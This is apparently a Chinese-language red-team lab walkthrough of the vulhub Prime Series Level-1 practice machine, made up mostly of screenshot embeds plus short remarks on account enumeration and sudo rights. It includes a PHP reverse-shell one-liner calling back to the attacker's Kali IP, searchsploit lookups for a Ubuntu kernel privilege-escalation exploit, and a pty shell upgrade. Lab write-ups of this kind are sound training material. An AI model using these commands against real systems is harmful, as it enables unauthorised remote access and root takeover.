---
title: 红队笔记-vulhub-Prime_Series_Level-1
date: 2026-01-25
updated: 2026-01-25
tags:
  - Others
categories:
  - Others
description: None
---
> - kali: 192.168.181.129
> - Prime_Series_Level-1: 192.168.181.0/24 ...

![[attachments/20260125.png]]

![[attachments/20260125-1.png]]

![[attachments/20260125-2.png]]

![[attachments/20260125-3.png]]

![[attachments/20260125-5.png]]

![[attachments/20260125-4.png]]

![[attachments/20260125-7.png]]

![[attachments/20260125-6.png]]

![[attachments/20260125-8.png]]

![[attachments/20260125-9.png]]

![[attachments/20260125-10.png]]

![[attachments/20260125-11.png]]

![[attachments/20260125-12.png]]

![[attachments/20260125-13.png]]

![[attachments/20260125-14.png]]

一般小于 1000 的账号都是功能性账号意义不大（除非可以直接拿到 root）

![[attachments/20260125-15.png]]

拿到用户名和密码


对内容管理系统扫描

扫用户

![[attachments/20260125-16.png]]

得到用户

自己浏览也是可以搜索到

![[attachments/20260125-17.png]]

![[attachments/20260125-18.png]]

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.181.129/443 0>&1'"); ?>
```

![[attachments/20260126.png]]

![[attachments/20260126-1.png]]

saket 用户不需要密码就可以以超级管理员的权限执行 

enc 特征字符

![[attachments/20260126-2.png]]

![[attachments/20260126-3.png]]

enc 当前没有读的权限

```bash
searchsploit Linux ubuntu 4.10.0-28

searchsploit Linux ubuntu -m 45010
```

![[attachments/20260126-4.png]]

```bash
php -S 0:80
```

![[attachments/20260126-5.png]]

![[attachments/20260126-6.png]]

![[attachments/20260126-7.png]]

执行后报错，重新编译并运行

```bash
python -c "import pty;pty.spawn('/bin/bash')"
```

![[attachments/20260126-8.png]]